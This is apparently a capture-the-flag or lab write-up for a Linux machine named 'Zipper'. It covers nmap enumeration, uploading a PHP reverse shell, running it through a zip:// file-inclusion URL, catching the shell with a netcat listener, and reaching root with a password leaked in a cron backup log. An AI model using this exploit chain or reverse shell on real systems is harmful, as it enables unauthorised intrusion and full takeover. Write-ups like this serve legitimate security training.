##### Tags: `cornjob`  `pspy`  `zipper`  `zip://`  `WildCard`  

# 🐧Zipper🐧
## Enumeration
Nmap
```console
$ nmap -sC -sV 192.168.249.229
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-16 19:55 AEDT

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is running a zipper upload webpage  
whatever file you upload will covert to zip file  
we try to upload a revershell.php and use burp suite to see why the file goes
```console
Respone

 <a href="uploads/upload_1771233472.zip" target="__blank">Click here to download the zip file
```
it ends up uploaded to /uploads and named upload_1771233472.zip    
cause the home page is http://192.168.249.229/index.php?file=home  
we change the file location to our reverse shell uploaded location
```console
http://192.168.249.229/index.php?file=zip://uploads/upload_1771233472.zip%23php-reverse-shell
```
```console
$ nc -lvnp 80                
listening on [any] 80 ...
connect to [192.168.45.210] from (UNKNOWN) [192.168.249.229] 42948

www-data@zipper:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation

upload linpeas.sh and found out there is a cron job backup.sh running every minute
```console
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/backup.sh
```
there are two files in /opt/backups
```console
www-data@zipper:/opt/backups$ ls -la 
ls -la
total 28
drwxr-xr-x 2 root root  4096 Feb 16 10:28 .
drwxr-xr-x 3 root root  4096 Aug 12  2021 ..
-rw-r--r-- 1 root root   609 Feb 16 10:28 backup.log
-rw-r--r-- 1 root root 16165 Feb 16 10:28 backup.zip
```
check the backup.log and found the password WildCardsGoingWild
```console
www-data@zipper:/opt/backups$ cat backup.log

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7413 24-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 16165

Scanning the drive:
8 files, 14883 bytes (15 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 8


Files read from disk: 8
Archive size: 16165 bytes (16 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
----------------
Scan WARNINGS: 1
```
```console
www-data@zipper:/opt/backups$ su root
Password: WildCardsGoingWild

root@zipper:/opt/backups# id
uid=0(root) gid=0(root) groups=0(root)
```
